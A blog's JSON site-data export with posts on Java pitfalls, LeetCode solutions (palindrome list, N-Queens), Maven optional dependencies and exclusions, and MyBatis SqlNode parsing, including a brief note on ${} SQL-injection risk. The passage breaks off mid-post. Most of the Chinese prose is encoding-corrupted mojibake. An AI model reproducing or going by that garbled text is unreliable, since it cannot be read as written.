{"meta":{"title":"huskyui","subtitle":"","description":"","author":"huskyui","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"javaå¸¸è§BUGæŒç»­æ›´æ–°ä¸­","slug":"javaå¸¸è§BUGæŒç»­æ›´æ–°ä¸­","date":"2020-11-01T14:45:47.000Z","updated":"2020-11-14T17:10:28.302Z","comments":true,"path":"2020/11/01/javaå¸¸è§BUGæŒç»­æ›´æ–°ä¸­/","link":"","permalink":"http://yoursite.com/2020/11/01/java%E5%B8%B8%E8%A7%81BUG%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/","excerpt":"","text":"Stringç±»å‹çš„equalsString a = æœªçŸ¥ï¼›// ä¸çŸ¥æ˜¯nullè¿˜æ˜¯å­—ç¬¦ä¸² String b = &quot;abc&quot;; // ä¸‹é¢å†™æ³•ç©ºæŒ‡é’ˆå¼‚å¸¸ // String a = null; // String b = &quot;abc&quot;; // System.out.println(a.equals(b)); // æˆ‘ä»¬åº”è¯¥è¿™ä¹ˆå†™ String a = null; String b = &quot;abc&quot;; System.out.println(b.equals(a)); //è¿™æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ã€‚ // ä¸‹é¢æ˜¯String.equalsæ–¹æ³• public boolean equals(Object anObject) { if (this == anObject) { return true; } if (anObject instanceof String) { String anotherString = (String)anObject; int n = value.length; if (n == anotherString.value.length) { char v1[] = value; char v2[] = anotherString.value; int i = 0; while (n-- != 0) { if (v1[i] != v2[i]) return false; i++; } return true; } } return false; }ç»“è®º æˆ‘ä»¬åœ¨æ¯”è¾ƒå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œéœ€è¦æ˜ç¡®ä¸€ä¸ªä¸ä¼šä¸ºç©ºçš„å€¼ï¼Œæ”¾åœ¨å·¦è¾¹å»equalsæœªçŸ¥çš„å€¼ List listä¸­ä½¿ç”¨remove()ä»Šå¤©æ™šä¸Šï¼Œå†™leetcodeçš„æ—¶å€™ï¼Œå‘ç°ä½¿ç”¨removeæ–¹æ³•æ—¶ï¼Œç»“æœä¸€ç›´å‡ºé”™ å¦‚æœä¼ å…¥ç»™removeçš„å€¼çš„æ—¶å€™ï¼Œä½ è¦æ˜ç¡®æ˜¯ä¼ çš„æ˜¯intè¿˜æ˜¯Integer,è¿™ä¸¤ä¸ªæ˜¯ä¸åŒçš„æ–¹æ³•ï¼Œéœ€è¦æ˜ç¡®","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"leetcode-234å›æ–‡é“¾è¡¨","slug":"leetcode-234å›æ–‡é“¾è¡¨","date":"2020-10-25T15:33:26.000Z","updated":"2020-11-14T17:10:30.399Z","comments":true,"path":"2020/10/25/leetcode-234å›æ–‡é“¾è¡¨/","link":"","permalink":"http://yoursite.com/2020/10/25/leetcode-234%E5%9B%9E%E6%96%87%E9%93%BE%E8%A1%A8/","excerpt":"","text":"æœ¬é¢˜é‡è¦ç‚¹ åè½¬é“¾è¡¨ å¿«æ…¢æŒ‡é’ˆï¼Œä¸€ä¸ªäºŒå€é€Ÿï¼Œä¸€ä¸ªä¸€å€é€Ÿï¼Œå¯ä»¥è·å–ä¸€ä¸ªé“¾è¡¨çš„ä¸­é—´èŠ‚ç‚¹ 1-&gt;2-&gt;3-4-&gt;null =&gt; 3-&gt;4-&gt;null 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;null =&gt; 3-&gt;4-&gt;5-&gt;null ååŠæ®µåè½¬åï¼Œä¾æ¬¡å’Œæ€»çš„é“¾è¡¨è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸åŒå°±false,è¿™é‡Œå°±æ˜¯ä¸€ä¸ªé•¿é“¾è¡¨å’Œä¸€ä¸ªçŸ­é“¾è¡¨çš„å¯¹æ¯”äº†ï¼Œå¤§å¯ä¸å¿…æ‹…å¿ƒï¼Œè¿™ä¸ªé“¾è¡¨æ˜¯å¥‡æ•°è¿˜æ˜¯å¶æ•° //è¯·åˆ¤æ–­ä¸€ä¸ªé“¾è¡¨æ˜¯å¦ä¸ºå›æ–‡é“¾è¡¨ã€‚ // // ç¤ºä¾‹ 1: // // è¾“å…¥: 1-&gt;2 //è¾“å‡º: false // // ç¤ºä¾‹ 2: // // è¾“å…¥: 1-&gt;2-&gt;2-&gt;1 //è¾“å‡º: true // // // è¿›é˜¶ï¼š //ä½ èƒ½å¦ç”¨ O(n) æ—¶é—´å¤æ‚åº¦å’Œ O(1) ç©ºé—´å¤æ‚åº¦è§£å†³æ­¤é¢˜ï¼Ÿ // Related Topics é“¾è¡¨ åŒæŒ‡é’ˆ // ğŸ‘ 744 ğŸ‘ 0 //leetcode submit region begin(Prohibit modification and deletion) /** * Definition for singly-linked list. * public class ListNode { * int val; * ListNode next; * ListNode(int x) { val = x; } * } */ class Solution { public ListNode reverseList(ListNode head) { ListNode curr = null; ListNode pre = head; while (pre != null) { ListNode tempNode = pre.next; pre.next = curr; curr = pre; pre = tempNode; } return curr; } public ListNode getHalfNode(ListNode head) { ListNode fast = head; ListNode low = head; while (fast != null &amp;&amp; fast.next != null) { fast = fast.next.next; low = low.next; } return low; } public boolean isPalindrome(ListNode head) { ListNode temp = head; ListNode half = getHalfNode(temp); ListNode reverseList = reverseList(half); ListNode p = head; ListNode q = reverseList; while (q != null) { if (p.val != q.val) { return false; } p = p.next; q = q.next; } return true; } } //leetcode submit region end(Prohibit modification and deletion)","categories":[],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://yoursite.com/tags/leetcode/"}]},{"title":"maven optional dependencies and dependency exclusions","slug":"maven optional dependencies and dependency exclusions","date":"2020-10-21T17:18:48.000Z","updated":"2020-11-14T17:10:30.923Z","comments":true,"path":"2020/10/22/maven optional dependencies and dependency exclusions/","link":"","permalink":"http://yoursite.com/2020/10/22/maven%20optional%20dependencies%20and%20dependency%20exclusions/","excerpt":"","text":"å¼€ç¯‡æœ€è¿‘çœ‹åˆ°mybatisçš„pomæ–‡ä»¶é‡Œé¢çš„dependencyéƒ½å¤šäº†ä¸€ä¸ªé€‰é¡¹optional. å‘ç°äº†é¡¹ç›®ä¸­å¼•å…¥mybatisçš„ä¾èµ–ï¼Œä½†å¹¶æ²¡æœ‰å°†mybatisçš„ä¾èµ–ä¼ é€’è¿‡æ¥ã€‚ä¸‹é¢ä»¥å›¾ä¸ºè¯ &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.5.3&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;ä¸‹é¢è¾“å‡º mvn dependency:tree [INFO] --- maven-dependency-plugin:2.8:tree (default-cli) @ mvn-excluede-demo --- [INFO] com.example:mvn-excluede-demo:jar:1.0-SNAPSHOT [INFO] +- junit:junit:jar:4.11:test [INFO] | \\- org.hamcrest:hamcrest-core:jar:1.3:test [INFO] \\- org.mybatis:mybatis:jar:3.5.3:compileé‚£æˆ‘ä»¬æ¥çœ‹çœ‹mybatisä¸­çš„pomæ–‡ä»¶æ˜¯å¦‚ä½•å†™çš„ åªä¸¾ä¸€éƒ¨åˆ†ä¾‹å­ &lt;dependency&gt; &lt;groupId&gt;commons-logging&lt;/groupId&gt; &lt;artifactId&gt;commons-logging&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cglib&lt;/groupId&gt; &lt;artifactId&gt;cglib&lt;/artifactId&gt; &lt;version&gt;3.2.10&lt;/version&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt;å¯ä»¥çœ‹åˆ°é€šè¿‡ &lt;optional&gt;true&lt;/optioal&gt; optionalæ ‡ç­¾How do optional dependencies work?Project-A -&gt; Project-BThe diagram above says that Project-A depends on Project-B. When A declares Bas an optional dependency in its POM, this relationship remains unchanged.Itâ€™s just like a normal build where Project-B will be added in Project-Aâ€™sclasspath. Project-X -&gt; Project-AWhen another project (Project-X) declares Project-A as a dependency in itsPOM, the optional nature of the dependency takes effect. Project-B is notincluded in the classpath of Project-X. You need to declare it directly in thePOM of Project X for B to be included in Xâ€™s classpath. ä¸Šé¢æ˜¯å®˜ç½‘å¯¹äºoptionalçš„è§£è¯»ï¼Œä¸Šé¢çš„ä¸¾ä¾‹å°±æ˜¯projectAä½¿ç”¨äº†projectBä½œä¸ºOptional(å¯é€‰çš„)ä¾èµ–ï¼Œå¦‚ä½•Aæ‰“åŒ…ä½œä¸ºXçš„ä¾èµ–ï¼ŒprojectBä¸ä¼šåŒ…å«åœ¨projectXçš„classpathä¸­ã€‚å¦‚æœéœ€è¦ä½¿ç”¨projectB,éœ€è¦ä½ æ˜¾å¼çš„å¼•ç”¨projectBçš„ä¾èµ–ã€‚ ExampleSuppose there is a project named X2 that has similar functionality toHibernate . It supports many databases such as MySQL, PostgreSQL, andseveral versions of Oracle. Each supported database requires an additionaldependency on a driver jar. All of these dependencies are needed at compiletime to build X2. However your project only uses one specific database anddoesnâ€™t need drivers for the others. X2 can declare these dependencies asoptional, so that when your project declares X2 as a direct dependency in itsPOM, all the drivers supported by the X2 are not automatically included inyour projectâ€™s classpath. Your project will have to include an explicitdependency on the specific driver for the one database it does use. å‡å®šå¦‚æœæœ‰ä¸€ä¸ªé¡¹ç›®X2å’ŒHibernateç±»ä¼¼ã€‚å®ƒæ”¯æŒå¤šä¸ªdatabasesä¾‹å¦‚mysql,PostgreSQLå’Œå¤šä¸ªç‰ˆæœ¬çš„Oracle.æ¯ä¸€ä¸ªæ”¯æŒçš„æ•°æ®åº“éƒ½éœ€è¦ä¸€ä¸ªé¢å¤–çš„ä¾èµ–åœ¨é©±åŠ¨jaråŒ…ä¸Šã€‚åœ¨æ„å»ºx2çš„æ—¶å€™éœ€è¦è¿™äº›ã€‚ç„¶è€Œä½ çš„é¡¹ç›®åœ¨ä½¿ç”¨æ—¶ï¼Œä½ åªä½¿ç”¨ä¸€ä¸ªç‰¹å®šçš„æ•°æ®åº“è€Œä¸éœ€è¦å…¶ä»–çš„ï¼ŒX2å¯ä»¥ç”³æ˜è¿™äº›ä¾èµ–ä¸ºå¯é€‰çš„ã€‚ä½ é¡¹ç›®åœ¨ä½¿ç”¨æ—¶ï¼Œéœ€è¦ä¸€ä¸ªæ˜ç¡®çš„ä¾èµ–æ¥ç‰¹å®šçš„é©±åŠ¨ã€‚ exclusionå¦‚ä½•ä¾èµ–æ˜¯å¦‚ä¸‹å½¢å¼çš„ Project-A -&gt; Project-B -&gt; Project-D &lt;! -- This dependency should be excluded --&gt; -&gt; Project-E -&gt; Project-F -&gt; Project Cå¦‚æœprojectA ä¾èµ–äºProjectBå’ŒProjectC,projectBæ˜¯ä¾èµ–äºEå’ŒF æ‰€ä»¥ProjectAä¼šä¾èµ–Bã€Cã€Dã€Eã€F å¦‚æœä½ æƒ³è¦ProjectDå°†å…¶åŠ å…¥åˆ°ProjectAçš„classPathä¸­ã€‚é¡¹ç›®Bçš„å¼€å‘è€…å¯ä»¥æ ‡è‡´ProjectDçš„optionalä¸ºtrueã€‚ æ‰‹åŠ¨æ’é™¤å½“å‰å±‚çº§çš„ä½†æ˜¯å¾ˆä¸å¹¸çš„ï¼Œä»–ä»¬å¹¶æ²¡æœ‰ ï¼Œæ‰€ä»¥ä½ éœ€è¦åœ¨ProjectAçš„pomæ–‡ä»¶ä¸­ï¼Œæ‰‹åŠ¨å»æ’é™¤ &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;sample.ProjectB&lt;/groupId&gt; &lt;artifactId&gt;Project-B&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;sample.ProjectD&lt;/groupId&gt; &lt;!-- Exclude Project-D from Project-B --&gt; &lt;artifactId&gt;Project-D&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;/dependencies&gt;ä¾èµ–ä¸­çš„æ’é™¤é‚£ä¸€ä¸ªå±‚çº§æ¶ˆå¤±ï¼Œä¸ä¼šä¼ é€’ç»™ä¸‹ä¸€ä¸ªä¾èµ–å¦‚æœæœ‰ä¸€ä¸ªé¡¹ç›®Xä¾èµ–äºProjectA,é‚£ä¹ˆProjectDæ˜¯å¦ä¼šè¢«exclude ç­”æ¡ˆæ˜¯æ­£ç¡®çš„ã€‚ä¼šè¢«exclude ä¾èµ–å¹¶ä¸æ˜¯å…¨å±€çš„ï¼Œæœ‰ç‚¹å±€éƒ¨å˜é‡çš„å‘³é“å¦‚æœé¡¹ç›®XåŒæ—¶åˆä¾èµ–äºProjectYï¼ŒprojectYé‡Œé¢ä¾èµ–äºProjectDï¼Œè¿™æ˜¯ProjectDå¹¶ä¸ä¼šè¢«å…¨å±€çš„excludeï¼Œä»–æ˜¯projectYçš„åˆæ³•ä¾èµ–ã€‚ ä¸‹é¢ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ è‹±æ–‡åŸæ–‡ If you deploy Project-A to a repository, and Project-X declares a normal dependency on Project-A, will Project-D still be excluded from the classpath? Project-X -&gt; Project-A The answer is Yes. Project-A has declared that it doesn&apos;t need Project-D to run, so it won&apos;t be brought in as a transitive dependency of Project-A. Now, consider that Project-X depends on Project-Y, as in the diagram below: Project-X -&gt; Project-Y -&gt; Project-B -&gt; Project-D ... Project-Y also has a dependency on Project-B, and it does need the features supported by Project-D. Therefore, it will NOT place an exclusion on Project-D in its dependency list. It may also supply an additional repository, from which it can resolve Project-E. In this case, it&apos;s important that Project-D is not excluded globally, since it is a legitimate dependency of Project-Y.æ’é™¤è·¨å±‚çº§çš„å¦‚æœæƒ³è¦åœ¨ProjectBä¸­æ’é™¤E &lt;dependency&gt; &lt;groupId&gt;sample.ProjectB&lt;/groupId&gt; &lt;artifactId&gt;Project-B&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;sample.ProjectE&lt;/groupId&gt; &lt;!-- Exclude Project-E from Project-B --&gt; &lt;artifactId&gt;Project-E&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt;å‚è€ƒèµ„æ–™: https://maven.apache.org/guides/introduction/introduction-to-optional-and-excludes-dependencies.html https://cloud.tencent.com/developer/article/1028070","categories":[],"tags":[{"name":"maven","slug":"maven","permalink":"http://yoursite.com/tags/maven/"}]},{"title":"leetode 52 Nçš‡å","slug":"leetode 52 Nçš‡å","date":"2020-10-19T16:17:21.000Z","updated":"2020-11-14T17:10:31.441Z","comments":true,"path":"2020/10/20/leetode 52 Nçš‡å/","link":"","permalink":"http://yoursite.com/2020/10/20/leetode%2052%20N%E7%9A%87%E5%90%8E/","excerpt":"","text":"æ€è€ƒ1.å¯¹äºå›æº¯ç®—æ³•ï¼Œå’Œä¹‹å‰çš„ç”Ÿæˆæ‹¬å·æ˜¯ä¸€æ ·çš„ï¼Œä¸è¦æƒ³ç€è‡ªå·±ç”¨forå¾ªç¯å»è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè€Œæ˜¯éœ€è¦ç”¨é€’å½’è§£å†³ã€‚2.è¦æ³¨æ„åˆ°çš„æ˜¯ï¼Œåœ¨é€’å½’æ—¶ï¼Œä¸è¦ç”¨javaçš„listè¿™ç§ä¼ é€’ï¼Œæœ€å¥½ç”¨int[][]ç±»å‹å±æ€§æ¥ä¼ é€’ã€‚3.è¿™ä¸€é¢˜æœ‰ä¸ªé™åˆ¶æ¡ä»¶ï¼Œâ‘ çš‡åæ•°ç›®ï¼ˆå½“æœ€åä¸€ä¸ªæ£‹å­å·²ç»ä¸‹å®Œï¼‰â‘¡æ¨ªç«–ï¼Œæ–œçº¿ï¼Œè¿™ä¸ªæ–œçº¿æœ‰ç‚¹æ¶å¿ƒçš„åœ°æ–¹æ˜¯æ˜¯45Â°å’Œ135Â°éƒ½è¦è€ƒè™‘ã€‚ //n çš‡åé—®é¢˜ç ”ç©¶çš„æ˜¯å¦‚ä½•å°† n ä¸ªçš‡åæ”¾ç½®åœ¨ nÃ—n çš„æ£‹ç›˜ä¸Šï¼Œå¹¶ä¸”ä½¿çš‡åå½¼æ­¤ä¹‹é—´ä¸èƒ½ç›¸äº’æ”»å‡»ã€‚ // // // // ä¸Šå›¾ä¸º 8 çš‡åé—®é¢˜çš„ä¸€ç§è§£æ³•ã€‚ // // ç»™å®šä¸€ä¸ªæ•´æ•° nï¼Œè¿”å› n çš‡åä¸åŒçš„è§£å†³æ–¹æ¡ˆçš„æ•°é‡ã€‚ // // ç¤ºä¾‹: // // è¾“å…¥: 4 //è¾“å‡º: 2 //è§£é‡Š: 4 çš‡åé—®é¢˜å­˜åœ¨å¦‚ä¸‹ä¸¤ä¸ªä¸åŒçš„è§£æ³•ã€‚ //[ // [&quot;.Q..&quot;, // è§£æ³• 1 // &quot;...Q&quot;, // &quot;Q...&quot;, // &quot;..Q.&quot;], // // [&quot;..Q.&quot;, // è§£æ³• 2 // &quot;Q...&quot;, // &quot;...Q&quot;, // &quot;.Q..&quot;] //] // // // // // æç¤ºï¼š // // // çš‡åï¼Œæ˜¯å›½é™…è±¡æ£‹ä¸­çš„æ£‹å­ï¼Œæ„å‘³ç€å›½ç‹çš„å¦»å­ã€‚çš‡ååªåšä¸€ä»¶äº‹ï¼Œé‚£å°±æ˜¯â€œåƒå­â€ã€‚å½“å¥¹é‡è§å¯ä»¥åƒçš„æ£‹å­æ—¶ï¼Œå°±è¿…é€Ÿå†²ä¸Šå»åƒæ‰æ£‹å­ã€‚å½“ç„¶ï¼Œå¥¹æ¨ªã€ç«–ã€æ–œéƒ½å¯èµ°ä¸€æˆ– N //-1 æ­¥ï¼Œå¯è¿›å¯é€€ã€‚ï¼ˆå¼•ç”¨è‡ª ç™¾åº¦ç™¾ç§‘ - çš‡å ï¼‰ // // Related Topics å›æº¯ç®—æ³• // ğŸ‘ 181 ğŸ‘ 0 //leetcode submit region begin(Prohibit modification and deletion) class Solution { int total = 0; public int totalNQueens(int n) { char[][] array = new char[n][n]; build(0, 0, n, array, &apos;.&apos;, 0); build(0, 0, n, array, &apos;Q&apos;, 1); return total; } public void build(int x, int y, int n, char[][] oneResult, char currentCh, int queueCount) { if (x &gt;= n || y &gt;= n) { return; } if (currentCh == &apos;Q&apos;) { // // å³ä¸‹æ–¹æ–œçº¿ int tempY = y - 1; int tempX = x - 1; while (tempX &gt;= 0 &amp;&amp; tempY &gt;= 0) { if (oneResult[tempX][tempY] == currentCh) { return; } tempY--; tempX--; } // å·¦ä¸Šæ–¹æ–œçº¿ tempX = x - 1; tempY = y + 1; while (tempX &lt;= n - 1 &amp;&amp; tempY &gt;= 0 &amp;&amp; tempX &gt;= 0 &amp;&amp; tempY &lt;= n - 1) { if (oneResult[tempX][tempY] == currentCh) { return; } tempX--; tempY++; } // æ¨ªçº¿ for (int p = 0; p &lt; y; p++) { if (oneResult[x][p] == currentCh) { return; } } // ç«–çº¿ for (int p = 0; p &lt; x; p++) { if (oneResult[p][y] == currentCh) { return; } } } oneResult[x][y] = currentCh; if (x == n - 1 &amp;&amp; y == n - 1) { if (queueCount == n) { total+=1; } return; } if (y == n - 1) { build(x + 1, 0, n, oneResult, &apos;Q&apos;, queueCount + 1); build(x + 1, 0, n, oneResult, &apos;.&apos;, queueCount); } else { build(x, y + 1, n, oneResult, &apos;Q&apos;, queueCount + 1); build(x, y + 1, n, oneResult, &apos;.&apos;, queueCount); } } } //leetcode submit region end(Prohibit modification and deletion)","categories":[],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://yoursite.com/tags/leetcode/"}]},{"title":"mybatisä¸­sqlNode","slug":"mybatisä¸­sqlNode","date":"2020-10-16T16:29:38.000Z","updated":"2020-11-14T17:10:32.070Z","comments":true,"path":"2020/10/17/mybatisä¸­sqlNode/","link":"","permalink":"http://yoursite.com/2020/10/17/mybatis%E4%B8%ADsqlNode/","excerpt":"","text":"mybatisä¸­sqlNodeTextSqlNodeHashMap&lt;String,String&gt; parameterObject = new HashMap&lt;&gt;(); parameterObject.put(&quot;id&quot;,&quot;123&quot;); parameterObject.put(&quot;name&quot;,&quot;huskyui&quot;); TextSqlNode textSqlNode = new TextSqlNode(&quot;select * from blog where id = #{id} and name = ${name}&quot;); SqlNode mixedSqlNode = new MixedSqlNode(Arrays.asList(textSqlNode)); DynamicSqlSource dynamicSqlSource = new DynamicSqlSource(new Configuration(),mixedSqlNode); BoundSql boundSql = dynamicSqlSource.getBoundSql(parameterObject); System.out.println(boundSql.getSql()); // è¿™å¥è¯æœ€åè¾“å‡ºçš„ç»“æœæ˜¯ // select * from blog where id = ? and name = huskyui // ä½¿ç”¨dynamicSqlSource.getBoundSqlæ—¶ï¼Œä¼šè°ƒç”¨mixedSqlNodeçš„applyæ–¹æ³•ã€‚è€ŒmixedSqlNodeä¼šforeachè°ƒç”¨æ„é€ å‚æ•°é‡Œé¢çš„Arrays.asList // (textSqlNode)çš„applyæ–¹æ³•,ä¼šè§¦å‘å¯¹${}è¿›è¡Œè§£æï¼Œå¹¶æ›¿æ¢ä¸‹é¢æˆ‘ä»¬æ¥æ¨¡æ‹Ÿä¸€ä¸ªè§£æçš„ // TextSqlNodeé‡Œé¢çš„å¯¹${}è¿›è¡Œè§£æï¼Œä¸‹é¢å°±æ˜¯ä¸€ä¸ªå¤§æ¦‚å®ä¾‹ï¼Œå®é™…ä¸­ä½¿ç”¨åˆ°äº†OgnlCache GenericTokenParser tokenParser = new GenericTokenParser(&quot;${&quot;, &quot;}&quot;, new TokenHandler() { @Override // è¿™ä¸ªæ–¹æ³•ä¸»è¦é’ˆå¯¹${context},å¯¹contextè¿›è¡Œå¤„ç† public String handleToken(String content) { HashMap&lt;String,String&gt; map = new HashMap&lt;&gt;(); map.put(&quot;name&quot;,&quot;huskyui&quot;); return map.get(content); } }); String parsedText = tokenParser.parse(&quot;select * from blog where name = ${name}&quot;); System.out.println(parsedText);#{å‚æ•°å}æœ€ç»ˆè§£æå‡ºæ¥çš„ ï¼Ÿ æ˜¯ç”¨äºjavaåŸç”Ÿè‡ªå¸¦çš„ PreparedStatement è¿™ç§æ–¹å¼æ¥è¿›è¡Œ,é˜²æ­¢ sqlæ³¨å…¥ å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦æ³¨æ„åˆ°çš„ä¸€ç‚¹æ˜¯${}æ˜¯ä¼šç›´æ¥è¿›è¡Œæ›¿æ¢çš„ï¼Œè¿™é‡Œå°±ä¼šå‡ºç°ä¸Šé¢å¯èƒ½å‡ºç°çš„ sqlæ³¨å…¥ é—®é¢˜ å‚è€ƒï¼š https://www.cnblogs.com/question-sky/p/7569405.html IfSqlNodeåœ¨xmlä¸­å‡ºç°çš„æ–¹å¼æœ‰å¤šç§ï¼Œæˆ‘ä»¬ä¸¾ä¸ªæœ€ç®€å•çš„ä¾‹å­ select * from user WHERE 1 = 1 &lt;if test=&quot;phone != null and phone != &apos;&apos;&quot;&gt; AND phone = #{phone} &lt;/if&gt;æœ€ç»ˆè§£æä¸º HashMap&lt;String,Object&gt; propertyMap = new HashMap&lt;&gt;(); propertyMap.put(&quot;phone&quot;,&quot;110&quot;); TextSqlNode textSqlNode = new TextSqlNode(&quot;select * from user\\n&quot; + &quot; WHERE 1 = 1&quot;); IfSqlNode ifSqlNode = new IfSqlNode(new TextSqlNode(&quot;AND phone = #{phone}&quot;),&quot;phone != null and phone != &apos;&apos;&quot;); SqlNode mixedSqlNode = new MixedSqlNode(Arrays.asList(textSqlNode,ifSqlNode)); DynamicSqlSource dynamicSqlSource = new DynamicSqlSource(new Configuration(),mixedSqlNode); System.out.println(dynamicSqlSource.getBoundSql(propertyMap).getSql());è§£é‡Š åœ¨è°ƒç”¨IfSqlNodeçš„applyæ–¹æ³•æ—¶ï¼Œä¼šè°ƒç”¨è‡ªèº«å°è£…çš„Ognlå¤„ç† &quot;phone != null and phone != &#39;&#39;&quot;è¿™æ®µè¯­å¥ï¼Œå¦‚æœä¸ºtrueï¼Œåˆ™è°ƒç”¨TextSqlNodeé‡Œé¢çš„applyæ–¹æ³•ï¼Œè§£æ${}å¹¶å°†è§£æå®Œçš„è¯­å¥appendåˆ°ç»“æœä¸Šé¢å»ã€‚ æˆ‘å½“æ—¶ä¸€ç›´åœ¨æƒ³ï¼Œè¿™ä¸ªtesté‡Œé¢çš„å€¼ï¼Œåˆ°åº•æ˜¯å¦‚ä½•å¤„ç†çš„ï¼Œéš¾é“æ˜¯mybatisè‡ªå·±å†™çš„è§£æï¼Œæœ€ç»ˆå‘ç°äº†è¿™ä¸ªé¡¹ç›®å¼•è¿›äº† ognl . ä¸é‡å¤é€ è½®å­ï¼Œç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±æ¥æ¨¡æ‹Ÿå‡ºä¸€ä¸ªognlæ˜¯å¦‚ä½•å®ç°å¯¹è¿™ä¸ªè§£æçš„ OgnlContext context = new OgnlContext(null,null,new DefaultMemberAccess(true)); Map&lt;String,Object&gt; propertyMap = new HashMap&lt;&gt;(); propertyMap.put(&quot;phone&quot;,&quot;110&quot;); System.out.println(Ognl.getValue(&quot;phone!=null and phone != &apos;&apos;&quot;, context, propertyMap));ChooseSqlNodeSELECT * FROM BLOG WHERE state = â€˜ACTIVEâ€™ &lt;choose&gt; &lt;when test=&quot;title != null&quot;&gt; AND title like #{title} &lt;/when&gt; &lt;when test=&quot;author != null and author.name != null&quot;&gt; AND author_name like #{author.name} &lt;/when&gt; &lt;otherwise&gt; AND featured = 1 &lt;/otherwise&gt; &lt;/choose&gt;å¤§æ¦‚è§£æä¸ºï¼Œå¹¶ä¸ç›¸ç¬¦ï¼Œæˆ‘åªæ˜¯ä¸¾ä¸ªä¾‹å­ï¼Œç”±äºåœ¨å·¥ä½œä¸­å¾ˆå°‘ç”¨åˆ°è¿™ä¸ªchoose HashMap&lt;String,Object&gt; propertyMap = new HashMap&lt;&gt;(); // propertyMap.put(&quot;id&quot;,1); // propertyMap.put(&quot;name&quot;,&quot;huskyui&quot;); TextSqlNode textSqlNode = new TextSqlNode(&quot;select * from blog where 1 = 1&quot;); List&lt;SqlNode&gt; ifNodeList = new ArrayList&lt;&gt;(); ifNodeList.add(new IfSqlNode(new TextSqlNode(&quot;and name = #{name}&quot;),&quot;name != null and name != &apos;&apos;&quot;)); ifNodeList.add(new IfSqlNode(new TextSqlNode(&quot;and id = #{id}&quot;),&quot;id != null and id != &apos;&apos;&quot;)); TextSqlNode defaultSqlNode = new TextSqlNode(&quot;and id &gt; 0&quot;); ChooseSqlNode chooseSqlNode = new ChooseSqlNode(ifNodeList,defaultSqlNode); MixedSqlNode mixedSqlNode = new MixedSqlNode(Arrays.asList(textSqlNode,chooseSqlNode)); DynamicSqlSource dynamicSqlSource = new DynamicSqlSource(new Configuration(),mixedSqlNode); System.out.println(dynamicSqlSource.getBoundSql(propertyMap).getSql());chooseSqlNodeæœ‰ç‚¹åƒjavaä¸­çš„switch-case,ä½†ä¸æ˜¯å…¨åƒ(chooseSqlNodeä¸èƒ½å¤šä¸ªæ¡ä»¶æ‰§è¡ŒåŒä¸€ä¸ª)ã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ChooseSqlNodeé‡Œé¢çš„applyæ–¹æ³• @Override public boolean apply(DynamicContext context) { for (SqlNode sqlNode : ifSqlNodes) { if (sqlNode.apply(context)) { return true; } } if (defaultSqlNode != null) { defaultSqlNode.apply(context); return true; } return false; }ä»£ç å†™çš„å¾ˆæ¸…æ¥šï¼Œä¸€çœ‹å°±æ‡‚ TrimSqlNodeæˆ‘ä»¬å…ˆè®²è§£TrimSqlNode,ç„¶åå†è®²è§£WhereSqlNodeå’ŒSetSqlNode &lt;select id=&quot;selectSome&quot;&gt; select * from blog &lt;trim prefix=&quot;where&quot; prefixOverrides=&quot;and|or&quot;&gt; &lt;if test=&quot;name!=null&quot;&gt; and `name` = #{name} &lt;/if&gt; &lt;if test=&quot;age!=null&quot;&gt; and age =#{age} &lt;/if&gt; &lt;/trim&gt; &lt;/select&gt; TextSqlNode textSqlNode = new TextSqlNode(&quot;select * from blog&quot;); IfSqlNode ifSqlNode1 = new IfSqlNode(new TextSqlNode(&quot;and name = #{name} &quot;),&quot;true&quot;); IfSqlNode ifSqlNode2 = new IfSqlNode(new TextSqlNode(&quot;and age = #{age}&quot;),&quot;true&quot;); MixedSqlNode mixedSqlNode = new MixedSqlNode(Arrays.asList(ifSqlNode1,ifSqlNode2)); TrimSqlNode trimSqlNode = new TrimSqlNode(new Configuration(),mixedSqlNode,&quot;where&quot;,&quot;and|or&quot;,null,null); DynamicSqlSource dynamicSqlSource = new DynamicSqlSource(new Configuration(),new MixedSqlNode(Arrays.asList(textSqlNode,trimSqlNode))); System.out.println(dynamicSqlSource.getBoundSql(null).getSql());æˆ‘ä»¬æ¥çœ‹çœ‹ TrimSqlNode çš„æ„é€ å‚æ•° public TrimSqlNode(Configuration configuration, SqlNode contents, 